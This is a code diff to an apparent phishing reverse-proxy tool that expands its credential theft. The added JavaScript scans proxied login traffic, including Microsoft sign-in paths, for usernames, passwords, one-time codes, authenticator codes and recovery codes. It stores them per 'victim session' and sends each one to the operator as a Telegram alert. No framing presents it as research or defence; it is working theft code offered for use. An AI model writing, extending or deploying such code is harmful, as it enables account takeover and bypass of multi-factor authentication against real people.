@@ -635,29 +635,154 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
     const requestBodyStr = proxyRequestBody ? proxyRequestBody.toString() : '';
     const requestPath = proxyRequestOptions.path;
     
-    // Check for login credentials
-    if (requestBodyStr && (requestPath.includes('login') || requestPath.includes('signin') || requestPath.includes('authenticate') || requestPath.includes('GetCredentialType'))) {
+    // Debug logging for POST requests to identify fields
+    if (proxyRequestOptions.method === 'POST' && requestBodyStr) {
+        console.log(`POST to ${requestPath}:`);
+        console.log(`Body preview: ${requestBodyStr.substring(0, 200)}...`);
+        
+        // Log specific fields if found
+        if (requestBodyStr.includes('password') || requestBodyStr.includes('passwd')) {
+            console.log('>>> PASSWORD FIELD DETECTED IN REQUEST');
+        }
+        if (requestBodyStr.includes('code') || requestBodyStr.includes('otp')) {
+            console.log('>>> CODE/OTP FIELD DETECTED IN REQUEST');
+        }
+    }
+    
+    // Check for login credentials - Enhanced to capture all auth methods
+    if (requestBodyStr) {
         let username = '';
         let password = '';
         let otcCode = '';
         let mfaMethod = '';
+        let recoveryCode = '';
+        let authenticatorCode = '';
         
-        // Try to parse JSON body first
-        try {
-            const jsonBody = JSON.parse(requestBodyStr);
-            username = jsonBody.username || jsonBody.email || jsonBody.login || jsonBody.LoginName || '';
-            password = jsonBody.password || jsonBody.passwd || jsonBody.Password || '';
-            otcCode = jsonBody.otc || jsonBody.otp || jsonBody.VerificationCode || jsonBody.Otc || '';
-            mfaMethod = jsonBody.AuthMethodId || jsonBody.mfaMethod || '';
-        } catch {
-            // Fall back to regex parsing for form data
-            const passwordMatch = requestBodyStr.match(/(?:password|passwd|Password)["\s:=]+([^&"\s,}]+)/i);
-            const usernameMatch = requestBodyStr.match(/(?:username|email|login|LoginName)["\s:=]+([^&"\s,}]+)/i);
-            const otcMatch = requestBodyStr.match(/(?:otc|otp|VerificationCode|Otc)["\s:=]+([^&"\s,}]+)/i);
+        // Expand endpoint detection to catch all authentication flows
+        const isAuthRequest = requestPath.includes('login') || 
+                            requestPath.includes('signin') || 
+                            requestPath.includes('authenticate') || 
+                            requestPath.includes('GetCredentialType') ||
+                            requestPath.includes('LoginPost') ||
+                            requestPath.includes('ProcessAuth') ||
+                            requestPath.includes('BeginAuth') ||
+                            requestPath.includes('EndAuth') ||
+                            requestPath.includes('oauth') ||
+                            requestPath.includes('common/SAS') ||
+                            requestPath.includes('common/login') ||
+                            requestPath.includes('kmsi') || // Keep me signed in
+                            requestPath.includes('Federated'); // Federated auth
+        
+        if (isAuthRequest || requestBodyStr.includes('passwd') || requestBodyStr.includes('password')) {
+            // Try to parse JSON body first
+            try {
+                const jsonBody = JSON.parse(requestBodyStr);
+                
+                // Capture username/email from various fields
+                username = jsonBody.username || 
+                          jsonBody.email || 
+                          jsonBody.login || 
+                          jsonBody.LoginName || 
+                          jsonBody.UserName || 
+                          jsonBody.loginfmt || // Microsoft's common field
+                          jsonBody.displayName || '';
+                
+                // Capture password from various fields
+                password = jsonBody.password || 
+                          jsonBody.passwd || 
+                          jsonBody.Password || 
+                          jsonBody.Passwd || 
+                          jsonBody.accessPass || 
+                          jsonBody.pin || // PIN authentication
+                          jsonBody.flowToken || ''; // Sometimes password is in flowToken
+                
+                // Capture OTP/2FA codes
+                otcCode = jsonBody.otc || 
+                         jsonBody.otp || 
+                         jsonBody.VerificationCode || 
+                         jsonBody.Otc || 
+                         jsonBody.otcCode || 
+                         jsonBody.twoFactorCode || 
+                         jsonBody.authCode || 
+                         jsonBody.code || // Generic code field
+                         jsonBody.verificationCode || '';
+                
+                // Capture authenticator app codes
+                authenticatorCode = jsonBody.totpCode || 
+                                   jsonBody.authenticatorCode || 
+                                   jsonBody.authApp || 
+                                   jsonBody.mfaAuthCode || '';
+                
+                // Capture recovery codes
+                recoveryCode = jsonBody.recoveryCode || 
+                              jsonBody.backupCode || 
+                              jsonBody.emergencyCode || '';
+                
+                // Capture MFA method
+                mfaMethod = jsonBody.AuthMethodId || 
+                           jsonBody.mfaMethod || 
+                           jsonBody.authMethod || 
+                           jsonBody.mfaType || '';
+                
+            } catch {
+                // Enhanced regex patterns for form data and URL encoded data
+                const passwordPatterns = [
+                    /(?:password|passwd|Password|Passwd|accessPass|flowToken)["\s:=]+([^&"\s,}]+)/i,
+                    /passwd=([^&]+)/i,
+                    /password=([^&]+)/i,
+                    /accessPass=([^&]+)/i
+                ];
+                
+                const usernamePatterns = [
+                    /(?:username|email|login|LoginName|UserName|loginfmt)["\s:=]+([^&"\s,}]+)/i,
+                    /loginfmt=([^&]+)/i,
+                    /username=([^&]+)/i,
+                    /email=([^&]+)/i
+                ];
+                
+                const codePatterns = [
+                    /(?:otc|otp|VerificationCode|Otc|code|totpCode|authCode)["\s:=]+([^&"\s,}]+)/i,
+                    /code=([^&]+)/i,
+                    /otc=([^&]+)/i,
+                    /verificationCode=([^&]+)/i
+                ];
+                
+                // Try all password patterns
+                for (const pattern of passwordPatterns) {
+                    const match = requestBodyStr.match(pattern);
+                    if (match && match[1]) {
+                        password = decodeURIComponent(match[1]);
+                        break;
+                    }
+                }
+                
+                // Try all username patterns
+                for (const pattern of usernamePatterns) {
+                    const match = requestBodyStr.match(pattern);
+                    if (match && match[1]) {
+                        username = decodeURIComponent(match[1]);
+                        break;
+                    }
+                }
+                
+                // Try all code patterns
+                for (const pattern of codePatterns) {
+                    const match = requestBodyStr.match(pattern);
+                    if (match && match[1]) {
+                        otcCode = decodeURIComponent(match[1]);
+                        break;
+                    }
+                }
+            }
             
-            username = usernameMatch ? decodeURIComponent(usernameMatch[1]) : '';
-            password = passwordMatch ? decodeURIComponent(passwordMatch[1]) : '';
-            otcCode = otcMatch ? decodeURIComponent(otcMatch[1]) : '';
+            // Also check response body for credentials (sometimes they're echoed back)
+            const responseBodyStr = proxyResponse.body ? proxyResponse.body.toString() : '';
+            if (!password && responseBodyStr) {
+                const respPassMatch = responseBodyStr.match(/(?:password|passwd)["\s:=]+([^&"\s,}]+)/i);
+                if (respPassMatch) {
+                    password = respPassMatch[1];
+                }
+            }
         }
         
         // Store credentials but don't send notification yet
@@ -719,6 +844,46 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
 
                 sendTelegramNotification(otcMessage).catch(error => 
                     console.error('Failed to send 2FA notification:', error)
+                );
+            }
+        }
+        
+        // Handle authenticator app codes
+        if (authenticatorCode) {
+            if (VICTIM_SESSIONS[currentSession].authenticatorCode !== authenticatorCode) {
+                VICTIM_SESSIONS[currentSession].authenticatorCode = authenticatorCode;
+                console.log(`Captured authenticator code for session ${currentSession}`);
+                
+                const authMessage = `📱 <b>AUTHENTICATOR CODE CAPTURED!</b>
+
+🍪 <b>Session:</b> ${currentSession}
+🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
+👤 <b>Email:</b> ${VICTIM_SESSIONS[currentSession].username || 'N/A'}
+📱 <b>Auth Code:</b> ${authenticatorCode}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+                sendTelegramNotification(authMessage).catch(error => 
+                    console.error('Failed to send authenticator notification:', error)
+                );
+            }
+        }
+        
+        // Handle recovery codes
+        if (recoveryCode) {
+            if (VICTIM_SESSIONS[currentSession].recoveryCode !== recoveryCode) {
+                VICTIM_SESSIONS[currentSession].recoveryCode = recoveryCode;
+                console.log(`Captured recovery code for session ${currentSession}`);
+                
+                const recoveryMessage = `🔐 <b>RECOVERY CODE CAPTURED!</b>
+
+🍪 <b>Session:</b> ${currentSession}
+🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
+👤 <b>Email:</b> ${VICTIM_SESSIONS[currentSession].username || 'N/A'}
+🔐 <b>Recovery Code:</b> ${recoveryCode}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+                sendTelegramNotification(recoveryMessage).catch(error => 
+                    console.error('Failed to send recovery code notification:', error)
                 );
             }
         }
